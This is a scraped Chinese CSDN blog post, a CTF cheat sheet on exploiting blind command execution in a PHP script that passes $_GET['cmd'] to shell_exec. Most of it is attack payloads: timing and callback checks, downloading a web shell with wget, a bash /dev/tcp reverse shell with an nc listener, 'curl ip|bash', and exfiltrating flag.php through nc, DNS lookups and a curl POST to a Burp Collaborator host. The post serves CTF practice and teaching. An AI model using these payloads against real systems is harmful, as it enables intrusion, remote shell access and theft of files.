{"blogid": "123039067", "writerAge": "码龄2年", "writerBlogNum": "107", "writerCollect": "228", "writerComment": "16", "writerFan": "177", "writerGrade": "4级", "writerIntegral": "1403", "writerName": "Snakin_ya", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123039067.jpg", "writerRankTotal": "20854", "writerRankWeekly": "41457", "writerThumb": "306", "writerVisitNum": "131367", "blog_read_count": "2251", "blog_time": "于 2022-02-21 01:42:54 发布", "blog_title": "[CTF]命令执行无回显利用", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"_2\"></a>背景</h2>\n<p><code>exec,shell_exec</code>等函数可以执行命令但没有回显，我们需要寻找方法来得到命令执行后的结果</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n   <span class=\"token function\">highlight__file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span>\n   <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h2><a id=\"_13\"></a>判断命令是否执行</h2>\n<h3><a id=\"_15\"></a>延时</h3>\n<p>利用sleep函数</p>\n<pre><code>cmd=ls|sleep 5\n</code></pre>\n<h3><a id=\"HTTP_23\"></a>HTTP请求</h3>\n<p>目标主机通过向VPS发起<code>HTTP</code>请求，VPS监听到请求则代表命令执行成功(注意：<code>ping</code>命令不产生http请求)</p>\n<p>VPS：<code>nc -lvp 8888</code></p>\n<p>目标主机：<code>cmd=curl ip:8888</code></p>\n<h3><a id=\"DNS_31\"></a>DNS请求</h3>\n<p>利用dnslog</p>\n<h2><a id=\"_35\"></a>利用方式</h2>\n<h3><a id=\"_37\"></a>直接写入</h3>\n<p>利用cp命令：<code>cp flag.php 1.txt</code></p>\n<p>利用mv命令：<code>mv flag.php 1.txt</code></p>\n<p>利用<code>&gt;</code>输出结果到文件：<code>ls &gt; 1.txt</code></p>\n<p>利用wget下载：<code>wget http://ip/shell.txt &gt; shell.php</code>或者<code>wget http://ip/shell.txt -O shell.php</code></p>\n<h3><a id=\"shell_47\"></a>反弹shell</h3>\n<p><strong>bash反弹</strong></p>\n<p>目标主机：</p>\n<pre><code>bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1\n</code></pre>\n<p>VPS：</p>\n<pre><code>nc -lvp 8888\n</code></pre>\n<p>也可以将命令写入文件，之后在存在命令执行的地方输入<code>curl ip|bash</code>即可反弹</p>\n<h3><a id=\"_65\"></a>外带数据</h3>\n<p><strong>使用ceye或者dnslog</strong></p>\n<pre><code>cmd=curl `命令`.域名\n</code></pre>\n<p><strong>nc外带</strong></p>\n<pre><code>目标主机：nc ip 8888 &lt; flag.php\nVPS：nc -lvp 8888\n</code></pre>\n<p>当tcp不能使用，<code>-u</code>参数调整为udp</p>\n<pre><code>目标主机：nc -u ip 8888 &lt; flag.php\nVPS：nc -ulvp 8888\n</code></pre>\n<p><strong>burp(Collaborator Client)</strong></p>\n<blockquote>\n<p>使用curl -F将flag文件上传到Burp的Collaborator Client（Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies）(<code>-X</code>指定发送一个POST请求，<code>-F</code>指定要发送的文件)</p>\n<p>获取Collaborator Client分配给BURP的链接：</p>\n<pre><code>打开Burp主界面 --&gt;菜单（Burp）--&gt;Burp Collaboraor Client -- &gt; 点击 Copy to Clipboard\n</code></pre>\n</blockquote>\n<p>目标主机：</p>\n<pre><code>cmd=curl -X POST -F xx=@flag.php http://jj6xpgxristzkbn1fpkl32t6jxpndc.burpcollaborator.net\n</code></pre>\n<p><img alt=\"image-20220221013752788\" src=\"..\\..\\static\\image\\a2ed1e7d0db6a1b125e067198cf35308.png\"/></p>\n<p>参考：</p>\n<p>https://blog.csdn.net/weixin_33164837/article/details/112421828</p>\n<p>https://h0ld1rs.github.io/2021/06/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE/#burp-Collaborator-Client</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-02-21 01:42:54", "summary": "背景等函数可以执行命令但没有回显，我们需要寻找方法来得到命令执行后的结果判断命令是否执行延时利用函数请求目标主机通过向发起请求，监听到请求则代表命令执行成功注意：命令不产生请求：目标主机：请求利用利用"}